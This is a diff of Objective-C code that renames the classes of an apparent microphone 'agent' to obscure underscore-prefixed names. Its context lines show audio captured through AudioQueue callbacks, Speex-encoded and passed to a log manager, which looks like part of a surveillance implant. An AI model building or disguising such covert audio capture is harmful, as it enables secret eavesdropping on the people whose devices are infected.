@@ -22,7 +22,7 @@
 #define LOG_AUDIO_CODEC_AMR     0x01;
 
 
-static RCSMAgentMicrophone *sharedAgentMicrophone = nil;
+static __m_MAgentMicrophone *sharedAgentMicrophone = nil;
 
 void myInputAudioCallback(void                               *inUserData,
                           AudioQueueRef                      inAQ,
@@ -36,7 +36,7 @@ void myInputAudioCallback(void                               *inUserData,
 #endif
 
 	//AQState_t *aqData = (AQState_t *)inUserData;
-	RCSMAgentMicrophone *aqData = (RCSMAgentMicrophone *)inUserData;
+	__m_MAgentMicrophone *aqData = (__m_MAgentMicrophone *)inUserData;
   
   if (inNumPackets                            == 0
       && aqData.mDataFormat.mBytesPerPacket  != 0)
@@ -65,7 +65,7 @@ void myInputAudioCallback(void                               *inUserData,
   AudioQueueEnqueueBuffer(aqData.mQueue, inBuffer, 0, NULL);
 }
 
-@interface RCSMAgentMicrophone (private)
+@interface __m_MAgentMicrophone (private)
 
 - (int)_calculateBufferSizeForFormat: (const AudioStreamBasicDescription *)format
                          withSeconds: (float)seconds;
@@ -77,7 +77,7 @@ void myInputAudioCallback(void                               *inUserData,
 
 @end
 
-@implementation RCSMAgentMicrophone (private)
+@implementation __m_MAgentMicrophone (private)
 
 - (int)_calculateBufferSizeForFormat: (const AudioStreamBasicDescription *)format
                          withSeconds: (float)seconds
@@ -159,7 +159,7 @@ void myInputAudioCallback(void                               *inUserData,
   u_int complexity      = 1;
   u_int quality         = 5;
   
-  RCSMLogManager *_logManager = [RCSMLogManager sharedInstance];
+  __m_MLogManager *_logManager = [__m_MLogManager sharedInstance];
   
   // Create a new wide mode encoder
   speexState = speex_encoder_init(speex_lib_get_mode(SPEEX_MODEID_UWB));
@@ -349,7 +349,7 @@ void myInputAudioCallback(void                               *inUserData,
 
 @end
 
-@implementation RCSMAgentMicrophone
+@implementation __m_MAgentMicrophone
 
 @synthesize mIsRunning;
 @synthesize mDataFormat;
@@ -364,7 +364,7 @@ void myInputAudioCallback(void                               *inUserData,
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSMAgentMicrophone *)sharedInstance
++ (__m_MAgentMicrophone *)sharedInstance
 {
   @synchronized(self)
   {
@@ -679,7 +679,7 @@ void myInputAudioCallback(void                               *inUserData,
   agentAdditionalHeader->hiTimestamp = mHiTimestamp;
   agentAdditionalHeader->loTimestamp = mLoTimestamp;
   
-  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
+  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
   
   u_int fileNumber = 0;
   [mLockGeneric lock];
